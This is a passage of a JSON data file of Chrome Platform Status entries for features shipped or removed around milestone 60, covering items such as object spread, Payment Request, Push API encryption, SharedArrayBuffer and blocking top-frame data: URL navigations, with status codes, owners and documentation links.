        "https://googlechrome.github.io/samples/media/vp9-codec-string.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-10-24 00:41:52.115440",
      "by": "jmedley@google.com"
    },
    "name": "Object rest/spread properties",
    "tags": [
      "javascript",
      "object rest",
      "object spread"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tc39.github.io/proposal-object-rest-spread/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "gsathya@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5549",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3406",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=167963",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This introduces rest properties for object destructuring assignment and spread properties for object literals.",
    "id": 5657004848709632,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1ZlhIAoZkaSddN6dXbebzNjXUA-oIEwzOd3dgoVejnK8/",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/rest_parameters",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_operator"
      ],
      "samples": [
        "http://www.2ality.com/2016/10/rest-spread-properties.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-02-05 23:21:37.875570",
      "by": "jmedley@google.com"
    },
    "name": "PaymentDetailsInitId",
    "comments": "Strong positive view of the id from Facebook. All browsers are supportive (this was voted on in the w3c WG meetings).",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/browser-payment-api/#paymentdetailsinit-dictionary",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/browser-payment-api/pull/426",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "rob.buis@samsung.com",
          "rouslan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://crbug.com701254",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add a free-form identifier for payment request. This will be set using PaymentDetailsInit and reflected through PaymentRequest and PaymentResponse and to payment apps. If no identifier is specified a unique identifier will be created.",
    "id": 5645346663301120,
    "resources": {
      "docs": [
        "https://github.com/w3c/browser-payment-api/issues/388",
        "https://github.com/w3c/browser-payment-api/pull/426",
        "https://developer.mozilla.org/en-US/docs/Web/API/PaymentRequest/PaymentRequest",
        "https://developer.mozilla.org/en-US/docs/Web/API/PaymentRequest",
        "https://developer.mozilla.org/en-US/docs/Web/API/PaymentResponse"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-02-05 23:23:26.484920",
      "by": "jmedley@google.com"
    },
    "name": "PaymentRequest.complete result \"unknown\"",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/browser-payment-api/#dom-paymentcomplete",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/browser-payment-api/pull/312",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "hs1217.lee@samsung.com",
          "rouslan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 60,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/670291",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Replace the PaymentRequest.complete enum value \"\" with the more descriptive \"unknown\".",
    "id": 4977207155884032,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PaymentResponse/complete"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:49.593890",
      "by": "ericbidelman@google.com"
    },
    "name": "Push API: support for ietf-webpush-encryption-08",
    "tags": [
      "push",
      "api",
      "notifications"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-webpush-encryption-08",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://tools.ietf.org/html/draft-ietf-webpush-encryption-08",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PushAPI"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=679789",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chrome currently supports encrypted push message payloads encrypted with the `aesgcm` content encoding (draft 03). A series of substantial changes were made to the encryption drafts, yielding a new content coding: `aes128gcm` (draft 08). We'll continue to accept `aesgcm` for received push messages as well.",
    "id": 5665412549181440,
    "resources": {
      "docs": [
        "https://tools.ietf.org/html/draft-ietf-webpush-encryption-03",
        "https://tools.ietf.org/html/draft-ietf-webpush-encryption-08"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-12-14 17:39:51.879990",
      "by": "jmedley@google.com"
    },
    "name": "PushManager.supportedContentEncodings",
    "tags": [
      "push",
      "api",
      "notifications"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/push-api/#dom-pushmanager-supportedcontentencodings",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/push-api/issues/251",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PushAPI"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=718020",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/push-api/issues/251",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Static property containing the supported content encodings developers can use for encrypting push messages.",
    "id": 5752837682233344,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PushManager",
        "https://developer.mozilla.org/en-US/docs/Web/API/PushManager/supportedContentEncodings"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-12-14 17:40:44.547270",
      "by": "jmedley@google.com"
    },
    "name": "PushSubscription.expirationTime",
    "tags": [
      "push",
      "api",
      "notifications"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/push-api/#dom-pushsubscription-expirationtime",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/push-api/issues/86",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PushAPI"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=718837",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/push-api/issues/86",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Property indicating the time at which, if any, the subscription won't be valid anymore. The user agent will attempt to fire a `pushsubscriptionchange` event with a new subscription before this happens.\r\n\r\nChrome will always return NULL, until we support subscription refreshes.",
    "id": 4929396687241216,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PushSubscription",
        "https://developer.mozilla.org/en-US/docs/Web/API/PushSubscription/expirationTime"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-12-14 17:41:38.325530",
      "by": "jmedley@google.com"
    },
    "name": "Remove Headers.prototype.getAll()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 60
        },
        "owners": [
          "corona10@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "desktop": 60,
        "flag": false,
        "bug": "https://crbug.com/645492",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Headers.prototype.getAll() is removed from the Fetch API specification.",
    "id": 5656023951998976,
    "resources": {
      "docs": [
        "https://github.com/whatwg/fetch/commit/42464c",
        "https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/x3YXciXQWM0",
        "https://developer.mozilla.org/en-US/docs/Web/API/Headers",
        "https://developer.mozilla.org/en-US/docs/Web/API/Headers/getAll"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-17 10:22:15.523940",
      "by": "Patket@microsoft.com"
    },
    "name": "Remove WEBKIT_KEYFRAMES_RULE and WEBKIT_KEYFRAME_RULE",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 60
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "ios": 60,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=689681",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove non-standardize APIs from CSS Rule and Developer can use KEYFRAMES_RULE and KEYFRAME_RULE instead",
    "id": 5747368108490752,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:44.478270",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove document.createEvent('WebKitTransitionEvent')",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-document-createevent",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 60
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/711600",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove non-standard 'WebKitTransitionEvent' support of document.createEvent().\r\n",
    "id": 5635892366540800,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-10-24 20:00:00.332890",
      "by": "jmedley@google.com"
    },
    "name": "Remove navigator.vibrate without user gesture",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "binlu@google.com",
          "animohan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>Vibration"
        ],
        "flag": false,
        "android": 60,
        "bug": "https://crbug.com/704650",
        "intervention": false
      },
      "opera": {
        "android": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Calls to navigator.vibrate will immediately return 'false' if user hasn't tapped on the frame or any embedded frame yet. The Vibrate API is being abused by malicious sites. This extends what we do for cross-origin iframes to all frames including top-level page. See https://www.chromestatus.com/features/5682658461876224.\r\n",
    "id": 5644273861001216,
    "resources": {
      "docs": [
        "https://github.com/WICG/interventions/issues/47",
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/vibrate"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-01-18 20:19:11.367830",
      "by": "jmedley@google.com"
    },
    "name": "Remove: Content initiated top frame navigations to data URLs",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 60
        },
        "owners": [
          "meacer@chromium.org",
          "emilyschechter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=684011",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We intend to block web pages from loading data: URLs in the top frame using <A> tags, window.open, window.location and similar mechanisms.\r\n\r\nPseudo URLs such as data: are generally a source of confusion for users. Because of their unfamiliarity, these schemes are widely being used in spoofing and phishing attacks. Users browsing the web ideally should only ever end up on the two well known schemes (http and https). \r\n\r\nDeprecated in M58\r\nRemoval in M60",
    "id": 5669602927312896,
    "resources": {
      "docs": [
        "https://bugs.chromium.org/p/chromium/issues/detail?id=594215"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:52.261910",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove: NodeFilter.prototype",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://heycam.github.io/webidl/#legacy-callback-interface-object",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 60
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/591919",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Correctly implement window.NodeFilter.  It should not have .prototype, and NodeIterator.filter and TreeWalker.filter should not wrap JavaScript objects.\r\n\r\n",
    "id": 5680382993235968,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:00.939430",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove: document.createEvent('WebKitAnimationEvent')",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-document-createevent",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 60
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/711601",
        "intervention": false
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove non-standard 'WebKitAnimationEvent' support of document.createEvent().",
    "id": 5736556333629440,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-03-30 16:35:51.686960",
      "by": "jmedley@google.com"
    },
    "name": "Rename `requireUserMediation` to `preventSilentAccess` in Credential Management API",
    "tags": [
      "Credential Management API",
      "CredentialsContainer",
      "requireUserMediation",
      "preventSilentAccess"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec-credential-management/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "vasilii@chromium.org",
          "jdoerrie@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>SecurityFeature>CredentialManagement"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/724464",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This change renames CredentialsContainer.requireUserMediation to CredentialsContainer.preventSilentAccess in the Credential Management API.",
    "id": 4781762488041472,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/06/credential-management-updates",
        "https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer",
        "https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer/preventSilentAccess"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-03-30 16:36:42.292010",
      "by": "jmedley@google.com"
    },
    "name": "Replace CredentialRequestOptions.unmediated flag with CredentialRequestOptions.mediation enum in Credential Management API",
    "tags": [
      "Credential Management API",
      "CredentialRequestOptions",
      "CredentialMediationRequirement"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec-credential-management/#enumdef-credentialmediationrequirement",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "jdoerrie@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>SecurityFeature>CredentialManagement"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/721399",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature introduces an CredentialMediationRequirement enum argument to the CredentialRequestOptions of CredentialsContainer.get() that is intended to replace the currently existing boolean flag CredentialRequestOptions.unmediated. The enum will have three states (\"silent\", \"optional\", \"required\") with \"silent\" and \"optional\" directly mapping to the existing boolean states, \"required\" is a novel option.\r\n",
    "id": 6076479909658624,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/06/credential-management-updates",
        "https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer",
        "https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer/get"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-12-14 17:44:12.181700",
      "by": "jmedley@google.com"
    },
    "name": "Require user gesture for beforeunload dialogs",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/browsers.html#unloading-documents",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=636905",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 60
        },
        "owners": [
          "avi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://crbug.com/707007",
        "intervention": true
      },
      "opera": {
        "android": 47,
        "desktop": 47
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/214277/webkit",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The beforeunload dialog will only be shown if the frame attempting to display it has received a user gesture or user interaction (or if any embedded frame has received such a gesture). (There will be no change to the dispatch of the beforeunload event, just a change to whether the dialog is shown.)\r\n",
    "id": 5082396709879808,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/BeforeUnloadEvent"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-09 14:23:58.778210",
      "by": "bradnelson@google.com"
    },
    "name": "Shared Array Buffers, Atomics and Futex APIs",
    "tags": [
      "SharedArrayBuffer"
    ],
    "comments": "It has a primary use case for asm.js code, but is also useful for implementing other higher-level sharing between Workers.\r\nSee https://blog.mozilla.org/javascript/2015/02/26/the-path-to-parallel-javascript/ for some discussion of the possibilities.\r\n\r\nIt also is likely to be how future WebAssembly shared memory is exposed to Web APIS.\r\n\r\nNote that Chrome's implementation of SharedArrayBuffer contains a non-standard attribute: SharedArrayBuffer.isView. The Blink team has an intent to remove it.\r\n",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://tc39.github.io/ecma262/#sec-sharedarraybuffer-objects",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1312446",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "binji@chromium.org",
          "bradnelson@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "blink_components": [
          "Blink>JavaScript"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=709179",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/wiki/Release-Notes#v140",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_10_1.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adds a new JavaScript type SharedArrayBuffer. SharedArrayBuffers can be sent to Workers and without neutering the sent buffer. The underlying buffer will be shared between the workers.\r\n\r\nThe Atomic API provides atomic loads and stores and Read/Modify/Write accesses to SharedArrayBuffers.\r\n\r\nThe Atomic.wait provides the ability for a worker to wait for another worker to signal it, without having to spinlock.",
    "id": 4570991992766464,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer"
      ],
      "samples": [
        "https://github.com/tc39/test262/tree/master/test/built-ins/SharedArrayBuffer",
        "https://github.com/tc39/test262/tree/master/test/built-ins/Atomics"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-30 00:16:22.480700",
      "by": "ericbidelman@google.com"
    },
    "name": "Support VP9 in ISO-BMFF",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 60
        },
        "owners": [
          "kqyang@chromium.org",
          "hbengali@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 60,
        "ios": 60,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 60,
        "flag": false,
        "android": 60,
        "bug": "http://crbug.com/580623",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "VP9 is an open and royalty free video coding format.\r\n\r\nISO-BMFF (MP4) is an industry standard container and is broadly accepted and used in the industry. \r\n\r\nChrome already supports the VP9 codec (currently only in WebM container) and the ISO-BMFF container. This enables them to be used together.",
    "id": 5762080762232832,
    "resources": {
      "docs": [
